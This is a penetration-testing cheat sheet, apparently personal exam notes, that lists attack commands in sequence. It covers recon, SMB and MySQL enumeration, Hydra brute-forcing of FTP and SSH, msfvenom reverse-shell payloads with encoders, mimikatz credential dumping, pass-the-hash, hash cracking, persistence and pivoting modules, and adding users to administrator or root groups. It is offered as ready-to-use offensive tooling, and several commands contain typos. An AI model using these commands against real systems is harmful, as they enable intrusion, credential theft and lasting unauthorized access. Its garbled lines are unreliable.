## Google Dorck:
```
site:      ===>
intitle:   ===>
cache:     ===>
inurl:     ===> 
filetype:  ===>
```

## Passive Recon:
```
host:     ===>
whatweb:  ===>
whois:    ===>
dig:      ===>
```
## Dns Recon:
```
dnsrec  ===>
dnsenum ===>
```
## Waf Detections:
```
wafwoof ===>
```

## Host Discovering:
```
nmap -sn 1.1.1.0/20 
sudo netdiscover -i ent0 -r 1.1.1.0/20 
```
## Network Maping:
```
-wireshark using arpscan
  sudo arp-scan -I tun0 -g 1.1.1.1/20
-fping
  fping -I tun0 -g 1.1.1.0/20 -a  2>/dev/null
```
## Nmap switch:
```
 * -Pn
 * -sU
 * -sCV
 * -PA
 * -T (0-5)
```
## SMB:
Nmap Script: 
 ```
 --script smb-protocols
 --script smb-security-mode
 --script smb-enum-sessions
 --script smb-enum-shares
 --script smb-enum-users
```

SmbMap:
 ```
 smbmap -u username -p "pass" -H 1.1.1.1
 smbmap -u username -p pass -H 1.1.1.1 -x "ipconfig"
 smbmap -u username -p pass -H 1.1.1.1 -r 'C$'
 smbmap -u username -p pass -H 1.1.1.1 --upload '/your-file-path/' 'C$\filename' 
 smbmap -u username -p pass -H 1.1.1.1 --download 'C$\download-file-path'
```
SmbClient:
```
 smbclient -L \\\\1.1.1.1\\
 smbclient //1.1.1.1/folder -N
 smbclient -L 1.1.1.1 -U username
 ```
smb with crackmapexe:
```
crackmapexec smb <ip> -u 'username' -p /passPATHfile/
crackmapexec smb <ip> -u username -p pass -X "whomai"
```
Smb with PsExec:
```
 psexec.py username@1.1.1.1
```

## MYSql:
```
mysql -h 1.1.1.1 -u username

Nmap Script:
 --script=mysql-empty-password
```

## FTP With Hydra:
```
hydra -L /usernamePathfile/ -P /passPATHfile/ <ip> ftp
hydra -l username -P /passPATHfile/ <ip> ftp 
```

## SSH With Haydra:
```
hydra -L /usernamePathfile/ -P /passPATHfile/ -t4 <ip> ssh
hydra -l username -P /passPATHfile/ <ip> ssh
```
## Samba:
```
hydra -L /usernamePathfile/ -P /passPATHfile/ -t4 <ip> ftp
smbclient -u username -p pass -H <ip>
enum4linux -a -u username -p pass <ip>
```
## Msfvenom:
```
Windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Your Port> -f exe > reverse.exe
Encoder:
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe

Linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Your Port> -f elf > reverse.elf
Encoder:
msfvenom -p linux/x86/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f elf > encoded.exe
```
## NetCat:
```
nc -lnvp <port>
```
## Banner Grabbing
``
nc -nv <ip> <port>
``
## Windows Privilege Esclations:
```
# Windows kernel             ===> use suggester module in metasploit
# By Passing UAC             ===> use UAC tool / or use bypassuac_injections module in metasploit
# Access Token Impersonation ===> load incognito 
 ```
## linux Privilege Esclations:
```
# Misconfigured Cron Jobs
# Suid Binaries
# Weak Permissions
# Sudo
```
## Windows Credential Dumping:
```
dump with mimikatz
# privilege::debug
# lsadump::sam 
# lsadump::secrets
```
## Linux Credential Dumping:
```
use MSF module ===>  modules/post/linux/gather/hashdump
```
## Pass The Hash:
```
crackmapexec smb <ip> -u username -H "NTLMHash"
psexec.py username@<ip> -hashes:
```
## Crack Hashing:
```
 Windows:
john --format=NT hash.txt --wordlist=/passPAThfile/
hashcat -a3 -m 1000 hash.txt /passPAthfile/

 Linux:
john --format=sha512crypt hash.txt --wordlist=/passPAThfile/
hashcat -a3 -m 1800 hash.txt /passPAthfile/
```

## Windows Persistence:
```
# windows service
 use MSF module ===> windows/local/persistence_service
```
## Linux Persistence:
```
# sshkey persistence
use MSF module ===> post/linux/manage/sshkey_persistence 
```

## Pivoting:
```
run autoroute -s <ip/20>
portfwd add -l <local-port> -p <remote-port> -r <ip>
```
## Windows Information:
```
 -Sys Enum:
   * systeminfo 
   * wmic qfe get HotFixId
 - User & group Eunm:
   * whoami
   * net user
   * net localgroup
   * net localgroup administrators test /add
   * whoami /priv
   * query user
 - Network Enum:
   * ipconfig /all
   * route print
   * arp -a
   * netstat -ano
 - Process $ service Enum:
   * net stat
   * tasklist /SVC
   * wmic service list brief
```
## Linux  Information:
```
 -Sys Enum:
   * cat /ect/issue
   * cat /etc/*release
   * uname -a
   * df -h
 - User & group Eunm:
   * groups root
   * cat /etc/passwd | grep -v /nologin
   * useradd -m test -s /bin/bash
   * usermod -aG root test
 - Network Enum:
   * netstat
   * route
   * cat /etc/networks
   * cat /etc/hosts
   * arp -a
 - Process $ service Enum:
   * ps -aux
   * top
   * crontab -l
   * ls al /etc/cron*
```
    



   





